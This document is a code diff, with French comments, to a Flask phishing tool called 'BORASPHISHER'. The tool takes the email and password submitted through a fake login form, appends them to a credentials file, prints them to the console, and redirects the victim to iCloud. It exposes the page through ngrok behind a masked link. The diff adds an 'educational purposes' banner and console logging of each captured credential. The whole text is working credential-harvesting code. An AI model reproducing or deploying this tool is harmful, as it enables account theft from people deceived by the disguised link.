@@ -10,6 +10,11 @@ CYAN = "\033[36m"
 RED = "\033[31m"
 RESET = "\033[0m"
 
+def display_banner():
+    print(f"{GREEN}BORASPHISHER{RESET}")
+    print(f"{CYAN}Created by oussamabtk | Version 1.0{RESET}")
+    print(f"{RED}Use this tool responsibly and only for educational purposes.{RESET}\n")
+
 app = Flask(__name__)
 
 # Dossier pour stocker les informations capturées
@@ -29,9 +34,13 @@ def submit():
     email = request.form.get("login_email")
     password = request.form.get("login_password")
 
-    # Enregistrer les informations dans un fichier
-    with open("captured/credentials.txt", "a") as f:
-        f.write(f"Email: {email}, Password: {password}\n")
+    if email or password:
+        # Enregistrer les informations dans un fichier
+        with open("captured/credentials.txt", "a") as f:
+            f.write(f"Email: {email}, Password: {password}\n")
+        print(f"{GREEN}[+] Informations capturées : Email={email}, Password={password}{RESET}")
+    else:
+        print(f"{RED}[!] Aucune information capturée.{RESET}")
 
     # Rediriger l'utilisateur vers une page légitime
     return redirect("https://www.icloud.com/")
@@ -125,8 +134,13 @@ def apply_custom_mask(url, mask):
 
 # Fonction principale
 def main():
+
+    # Afficher le banner
+    display_banner()
     # Démarrer Ngrok et obtenir le lien public
     public_url = start_ngrok()
+    # Démarrer le serveur Flask
+    start_flask()
 
     if public_url:
         # Afficher le lien public
@@ -146,9 +160,7 @@ def main():
 
         # Afficher le lien public masked
         print(f"{GREEN}[+] Votre lien raccourcir est accessible à l'adresse : {CYAN}{masked_url}{RESET}")
-
-        # Démarrer le serveur Flask
-        start_flask()
+     
     else:
         print(f"{RED}[!] Impossible de démarrer Ngrok. Vérifiez votre configuration.{RESET}")
 
